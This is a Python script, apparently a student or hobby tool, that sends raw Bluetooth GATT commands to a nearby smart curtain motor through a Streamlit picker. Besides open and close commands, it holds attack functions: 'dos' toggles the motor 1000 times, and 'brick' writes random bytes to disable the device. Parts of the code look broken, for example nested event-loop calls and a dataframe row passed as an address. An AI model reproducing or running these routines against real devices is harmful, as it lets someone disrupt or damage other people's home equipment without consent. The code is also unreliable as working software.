import asyncio
from bleak import BleakClient
from pandas.core.ops import logical_op
import streamlit as st
import random


# async def main(address):
#     device = loop.run_until_complete(BleakScanner.find_device_by_name("WoCurtain")
#     async with BleakClient(address) as client:

# gaan2 = bytes.fromhex("570f450508010202")
# gaan3 = bytes.fromhex("570f4505040002")
# test1 = bytes.fromhex("570f45050301")
# wya = bytes.fromhex("570f460100")
# test2 = bytes.fromhex("570f45050302")
# stopcal = bytes.fromhex("570f450502")
# crcinst = Crc8Maxim()
# crcinst.process(close)
# crcinst.process(open)
    # while (True):
    #     loop.run_until_complete(client.write_gatt_char(model, open)
    #     loop.run_until_complete(client.write_gatt_char(model, close)

    # loop.run_until_complete(client.write_gatt_char(model, start)
    # loop.run_until_complete(client.write_gatt_char(model, iets)
    # loop.run_until_complete(client.write_gatt_char(model, anders)
    # loop.run_until_complete(client.write_gatt_char(model, ltr)
    # loop.run_until_complete(client.write_gatt_char(model, gaan)
    #
    # loop.run_until_complete(client.write_gatt_char(model, stop)

global model 
model = "cba20002-224d-11e6-9fb8-0002a5d5c51b"
global loop
loop = asyncio.get_event_loop()

def dos():
    close = bytes.fromhex("570f450101010000")
    open = bytes.fromhex("570f45010101ff00")

    loop.run_until_complete(executeLooped(model, [open, close]))

def infinite():
    start = bytes.fromhex("570f450406010101")
    iets = bytes.fromhex("570f4504020100")
    anders = bytes.fromhex("570f450501")
    ltr = bytes.fromhex("570f450508010101")
    gaan = bytes.fromhex("570f4505040001")

    loop.run_until_complete(execute(model, [start, iets, anders, ltr, gaan]))

def stopInfinite():
    stop = bytes.fromhex("570f45050500")

    loop.run_until_complete(execute(model, [stop]))

def clear():
    clear = bytes.fromhex("570f450303")

    loop.run_until_complete(execute(model, [clear]))
    
def open():
    open = bytes.fromhex("570f45010101ff00")

    loop.run_until_complete(execute(model, [open]))

def close():
    close = bytes.fromhex("570f450101010000")

    loop.run_until_complete(execute(model, [close]))

def silent():
    silent = bytes.fromhex("570f450401010101") 

    loop.run_until_complete(execute(model, [silent]))

def normal():
    silent = bytes.fromhex("570f450401010000") 

    loop.run_until_complete(execute(model, [silent]))

def brick():
    brick = bytes([random.randint(0, 255) for _ in range(50)])

    loop.run_until_complete(execute(model, [brick]))

async def execute(model, toExecute):
    if (("address" not in st.session_state) or (len(st.session_state.address.selection.rows)) == 0):
        st.error("No object selected!")
        return
    address = st.session_state.df.loc[st.session_state.address.selection.rows[0], "address"]

    print(address)
    async with BleakClient(address) as client:
        for command in toExecute:
            print(model)
            print(command)
            loop.run_until_complete(client.write_gatt_char(model, command))

async def executeLooped(model, toExecute):
    if (("address" not in st.session_state) or (len(st.session_state.address.selection.rows)) == 0):
        st.error("No object selected!")
        return
    address = st.session_state.df.loc[st.session_state.address.selection.rows[0]]
    async with BleakClient(address) as client:
        for i in range(1000):
            for command in toExecute:
                loop.run_until_complete(client.write_gatt_char(model, command))

def hack():
    print("hi")

# def hack(function):
#     # address = "DA:2E:1C:E1:05:23"
#
#
#     try:
#         match function:
#             case "Clear":
#                 loop.run_until_complete(clear())
#             case "Open":
#                 loop.run_until_complete(open())
#             case "Close":
#                 loop.run_until_complete(close())
#             case "DOS":
#                 loop.run_until_complete(dos())
#             case "Infinite":
#                 loop.run_until_complete(infinite())
#             case "stopInfinite":
#                 loop.run_until_complete(stopInfinite())
#             case "Brick":
#                 loop.run_until_complete(brick())
#             case "Silent":
#                 loop.run_until_complete(silent)
#             case _:
#                 st.write("AAAAAAA")
#     except Exception as e:
#         print(e)
#
# asyncio.run(main(address))

# import asyncio
# from bleak import BleakScanner
#
# async def main():
#     devices = loop.run_until_complete(BleakScanner.discover()
#     for d in devices:
#         print(d)
#
# asyncio.run(main())
